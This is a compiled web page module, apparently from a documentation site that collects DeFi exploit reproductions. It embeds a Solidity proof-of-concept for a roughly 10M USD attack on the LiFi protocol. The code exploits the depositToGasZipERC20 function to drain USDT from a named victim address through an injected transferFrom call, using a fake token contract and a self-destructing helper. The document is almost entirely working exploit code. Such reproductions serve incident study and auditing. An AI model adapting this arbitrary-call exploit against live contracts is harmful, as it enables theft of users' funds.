import{_ as a,K as t,L as p,a5 as e,M as n,N as o,W as c,F as l}from"./framework-edebdfe1.js";const i={},u=n("h1",{id:"lifiprotocol",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#lifiprotocol","aria-hidden":"true"},"#"),o(" Lifiprotocol")],-1),k=c(`<h2 id="poc" tabindex="-1"><a class="header-anchor" href="#poc" aria-hidden="true">#</a> POC</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;forge-std/Test.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;../interface.sol&quot;</span><span class="token punctuation">;</span>

<span class="token comment">// @KeyInfo -- Total Lost : ~10M USD</span>
<span class="token comment">// TX : https://app.blocksec.com/explorer/tx/eth/0xd82fe84e63b1aa52e1ce540582ee0895ba4a71ec5e7a632a3faa1aff3e763873</span>
<span class="token comment">// Attacker : https://etherscan.io/address/0x8b3cb6bf982798fba233bca56749e22eec42dcf3</span>
<span class="token comment">// Attack Contract : https://etherscan.io/address/0x986aca5f2ca6b120f4361c519d7a49c5ac50c240</span>
<span class="token comment">// GUY : https://x.com/danielvf/status/1505689981385334784</span>

<span class="token keyword">library</span> <span class="token class-name">LibSwap</span> <span class="token punctuation">{</span>
    <span class="token keyword">struct</span> <span class="token class-name">SwapData</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> callTo<span class="token punctuation">;</span>
        <span class="token builtin">address</span> approveTo<span class="token punctuation">;</span>
        <span class="token builtin">address</span> sendingAssetId<span class="token punctuation">;</span>
        <span class="token builtin">address</span> receivingAssetId<span class="token punctuation">;</span>
        <span class="token builtin">uint256</span> fromAmount<span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> callData<span class="token punctuation">;</span>
        <span class="token builtin">bool</span> requiresDeposit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">interface</span>  <span class="token class-name">LiFiDiamond</span><span class="token punctuation">{</span>
    
   <span class="token keyword">function</span> <span class="token function">depositToGasZipERC20</span><span class="token punctuation">(</span>
        LibSwap<span class="token punctuation">.</span>SwapData <span class="token keyword">calldata</span> _swapData<span class="token punctuation">,</span>
        <span class="token builtin">uint256</span> _destinationChains<span class="token punctuation">,</span>
        <span class="token builtin">address</span> _recipient
    <span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token keyword">contract</span> <span class="token class-name">ContractTest</span> <span class="token keyword">is</span> Test <span class="token punctuation">{</span>
    IAaveFlashloan aave <span class="token operator">=</span> <span class="token function">IAaveFlashloan</span><span class="token punctuation">(</span><span class="token number">0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    WETH9 <span class="token keyword">private</span> <span class="token keyword">constant</span> WETH <span class="token operator">=</span> <span class="token function">WETH9</span><span class="token punctuation">(</span><span class="token number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 USDT <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0xdAC17F958D2ee523a2206206994597C13D831ec7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    LiFiDiamond Vulncontract<span class="token operator">=</span><span class="token function">LiFiDiamond</span><span class="token punctuation">(</span><span class="token number">0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CheatCodes cheats <span class="token operator">=</span> <span class="token function">CheatCodes</span><span class="token punctuation">(</span><span class="token number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> Victim<span class="token operator">=</span><span class="token number">0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF</span><span class="token punctuation">;</span>
    Money money<span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">setUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        vm<span class="token punctuation">.</span><span class="token function">createSelectFork</span><span class="token punctuation">(</span><span class="token string">&quot;mainnet&quot;</span><span class="token punctuation">,</span> <span class="token number">20318962</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">testExpolit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;[Begin] Attacker USDT before exploit&quot;</span><span class="token punctuation">,</span> USDT<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> USDT<span class="token punctuation">.</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;[End] Attacker USDT after exploit&quot;</span><span class="token punctuation">,</span> USDT<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> USDT<span class="token punctuation">.</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        money<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Money</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        LibSwap<span class="token punctuation">.</span>SwapData <span class="token keyword">memory</span> swapData <span class="token operator">=</span> LibSwap<span class="token punctuation">.</span><span class="token function">SwapData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            callTo<span class="token punctuation">:</span> <span class="token builtin">address</span><span class="token punctuation">(</span>USDT<span class="token punctuation">)</span><span class="token punctuation">,</span>
            approveTo<span class="token punctuation">:</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            sendingAssetId<span class="token punctuation">:</span> <span class="token builtin">address</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">,</span>
            receivingAssetId<span class="token punctuation">:</span> <span class="token builtin">address</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">,</span>
            fromAmount<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
            callData<span class="token punctuation">:</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token number">0x23b872dd</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>Victim<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2276295880553</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            requiresDeposit<span class="token punctuation">:</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Vulncontract<span class="token punctuation">.</span><span class="token function">depositToGasZipERC20</span><span class="token punctuation">(</span>swapData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">payable</span> <span class="token keyword">external</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Money</span>  <span class="token keyword">is</span> Test<span class="token punctuation">{</span>
    IAaveFlashloan aave <span class="token operator">=</span> <span class="token function">IAaveFlashloan</span><span class="token punctuation">(</span><span class="token number">0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    WETH9 <span class="token keyword">private</span> <span class="token keyword">constant</span> WETH <span class="token operator">=</span> <span class="token function">WETH9</span><span class="token punctuation">(</span><span class="token number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 Stone <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x7122985656e38BDC0302Db86685bb972b145bD3C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 USDT <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0xdAC17F958D2ee523a2206206994597C13D831ec7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    LiFiDiamond Vulncontract<span class="token operator">=</span><span class="token function">LiFiDiamond</span><span class="token punctuation">(</span><span class="token number">0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CheatCodes cheats <span class="token operator">=</span> <span class="token function">CheatCodes</span><span class="token punctuation">(</span><span class="token number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> Victim<span class="token operator">=</span><span class="token number">0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> other<span class="token operator">=</span><span class="token number">0xF929bA2AEec16cFfcfc66858A9434E194BAaf80D</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>
    Help help<span class="token punctuation">;</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> who<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">allowance</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

   <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        help<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        help<span class="token punctuation">.</span>sendto<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>Vulncontract<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Help</span>  <span class="token keyword">is</span> Test<span class="token punctuation">{</span>
    IAaveFlashloan aave <span class="token operator">=</span> <span class="token function">IAaveFlashloan</span><span class="token punctuation">(</span><span class="token number">0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    WETH9 <span class="token keyword">private</span> <span class="token keyword">constant</span> WETH <span class="token operator">=</span> <span class="token function">WETH9</span><span class="token punctuation">(</span><span class="token number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 Stone <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x7122985656e38BDC0302Db86685bb972b145bD3C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 USDT <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0xdAC17F958D2ee523a2206206994597C13D831ec7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    LiFiDiamond Vulncontract<span class="token operator">=</span><span class="token function">LiFiDiamond</span><span class="token punctuation">(</span><span class="token number">0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CheatCodes cheats <span class="token operator">=</span> <span class="token function">CheatCodes</span><span class="token punctuation">(</span><span class="token number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> Victim<span class="token operator">=</span><span class="token number">0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">sendto</span><span class="token punctuation">(</span><span class="token builtin">address</span> who<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> retData<span class="token punctuation">)</span><span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span>Vulncontract<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function d(r,v){const s=l("DocsAD");return t(),p("div",null,[u,e(s),k])}const m=a(i,[["render",d],["__file","Lifiprotocol.html.vue"]]);export{m as default};
